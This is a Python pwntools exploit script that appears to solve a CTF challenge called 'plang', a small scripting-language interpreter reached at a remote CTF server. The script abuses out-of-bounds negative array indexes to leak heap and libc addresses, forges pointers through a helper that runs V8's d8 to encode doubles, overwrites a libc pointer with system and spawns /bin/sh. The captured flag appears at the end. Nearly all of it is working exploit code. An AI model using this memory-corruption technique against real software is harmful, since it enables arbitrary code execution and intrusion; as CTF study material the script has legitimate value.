from pwn import *
import sys
import ctypes
import subprocess

def main():
    #context(log_level='DEBUG')
    if len(sys.argv) == 1:
        p = process("./plang")

    else:
        p = remote("111.186.63.210", 6666)

    # print("%.323f" %x)
    def converter(low, hi):
        #f = open("/Users/asiagaming/Desktop/v8/out.gn/x64.release/utils.js", "wb")
        f = open("/mnt/hgfs/vm_share/35c3_ctf/krautflare/utils.js", "wb")
        f.write('''
    var f64 = new Float64Array(1);
    var u32 = new Uint32Array(f64.buffer);

    function d2u(v) {
        f64[0] = v;
        return u32;
    }

    function u2d(lo, hi) {
        u32[0] = lo;
        u32[1] = hi;
        return f64[0];
    }
    ''' + "console.log(u2d({}, {}));".format(low, hi))
        f.close()

        #string = subprocess.check_output(["/Users/asiagaming/Desktop/v8/out.gn/x64.release/d8", "/Users/asiagaming/Desktop/v8/out.gn/x64.release/utils.js"])[:-1]
        string = subprocess.check_output(["/mnt/hgfs/vm_share/35c3_ctf/krautflare/d8", "/mnt/hgfs/vm_share/35c3_ctf/krautflare/utils.js"])[:-1]
        x = float(string)
        if "-" in string:
            tmp = string.split("-")[0].split(".")[1]
            tmp2 = string.split("-")[1]
            length = len(tmp) + int(tmp2)
            code = "\"%." + str(length) + "f\" %x"
            data = eval(code)
            return data

        elif "+" in string:
            tmp = string.split("+")[0].split(".")[1]
            tmp2 = string.split("+")[1]
            length = len(tmp) + int(tmp2)
            code = "\"{}%.".format(length) + "f\" %x"
            data = eval(code)
            return data

        else:
            return string

    payload = '''var a = ["11111111"]
    var b = ["1111111111111111","22222222","33333333"]
    b[-0x2a] = "cccc"'''
    pa = payload.split("\n")
    for code in pa:
        p.sendlineafter("> ", code)

    payload = ''' System.print(b[0].byteAt_(8))
    System.print(b[0].byteAt_(9))
    System.print(b[0].byteAt_(10))
    System.print(b[0].byteAt_(11))
    System.print(b[0].byteAt_(12))
    System.print(b[0].byteAt_(13))'''

    pa = payload.split("\n")
    heap = 0
    i = 0
    for code in pa:
        p.sendlineafter("> ", code)
        heap += int(p.recvline().strip())*0x100**i
        i += 1

    #print hex(heap)

    heap_base = heap - 89472
    libcHeap = heap - 0xe758 

    log.info("heap base : " + hex(heap_base))
    log.info("libc written in heap : 0x%x" % libcHeap)

    # need to -0x20
    converted_value = converter((libcHeap - 0x20) & 0xffffffff, (libcHeap >> 32) & 0xffff)
    log.info(converted_value)
    payload = '''var fake = "aaaaaaaabbbbbbbbccccccccddddddddeeeeeeee"
    var c = ["44444444","55555555","66666666"]
    System.writeString_(c[-0x3b] = %s)''' % converted_value

    pa = payload.split("\n")
    for code in pa:
        p.sendlineafter("> ", code)

    libc = u64(p.recvuntil("> ")[:-2].ljust(8, "\x00"))
    libc_base = libc - 0x3ebd20
    system = libc_base + 0x4f440
    log.info("heap base : " + hex(heap_base))
    log.info("libc base : " + hex(libc_base))
    log.info("system : " + hex(system))

    context.log_level = "debug"
    converted = converter((libc_base + 4118760 - 8) & 0xffffffff, libc_base >> 32)
    payload = ""
    for i in xrange(0, 0x3):
        payload += "c[-{}] = {}\n".format(hex(i), converted)

    p.sendline("var t = 123")
    pa = payload.split("\n")
    for code in pa:
        p.sendlineafter(">", code)

    #gdb.attach(p, "c\n")
    converted = converter((system) & 0xffffffff, libc_base >> 32)
    p.sendline("c[0] = {}".format(converted))
    for i in xrange(10):
        p.sendline('t = ["/bin/sh", "/bin/sh", "/bin/sh", "/bin/sh"')
    p.interactive()


if __name__ == "__main__":
    main()

# flag{Th1s_language_is_4_bit_p00r}
